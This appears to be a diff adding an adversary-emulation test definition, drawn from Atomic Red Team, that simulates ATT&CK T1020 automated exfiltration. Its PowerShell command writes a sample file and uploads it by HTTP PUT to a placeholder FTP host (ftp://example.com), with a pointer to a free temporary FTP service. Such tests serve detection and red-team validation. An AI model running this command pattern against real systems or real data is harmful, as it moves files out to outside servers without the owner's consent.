@@ -1,0 +1,47 @@
+- id: 5b380e96-b0ef-4072-8a8e-f194cb9eb9ac
+  name: Exfiltration via Encrypted FTP
+  description: Simulates encrypted file transfer to an FTP server. For testing purposes,
+    a free FTP testing portal is available at https://sftpcloud.io/tools/free-ftp-server,
+    providing a temporary FTP server for 60 minutes. Use this service responsibly
+    for testing and validation only.
+  tactic: exfiltration
+  technique:
+    attack_id: T1020
+    name: Automated Exfiltration
+  platforms:
+    windows:
+      psh:
+        command: $sampleData = "Sample data for exfiltration test"; Set-Content -Path
+          "C:\temp\T1020__FTP_sample.txt" -Value $sampleData; $ftpUrl = "ftp://example.com";
+          $creds = Get-Credential -Credential "[user:password]"; Invoke-WebRequest
+          -Uri $ftpUrl -Method Put -InFile "C:\temp\T1020__FTP_sample.txt" -Credential
+          $creds
+        cleanup: Remove-Item -Path "#{sampleFile}" -ErrorAction Ignore
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - exfiltration
+  - t1020
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      sampleFile:
+        description: Path of the sample file to exfiltrate.
+        type: String
+        default: C:\temp\T1020__FTP_sample.txt
+      ftpServer:
+        description: FTP server URL.
+        type: Url
+        default: ftp://example.com
+      credentials:
+        description: FTP server credentials.
+        type: String
+        default: '[user:password]'
+    technique_created: '2017-05-31T21:30:29.458Z'
+    atomic_guid: 5b380e96-b0ef-4072-8a8e-f194cb9eb9ac
+    import_timestamp: '2025-06-24T11:15:07.893196Z'
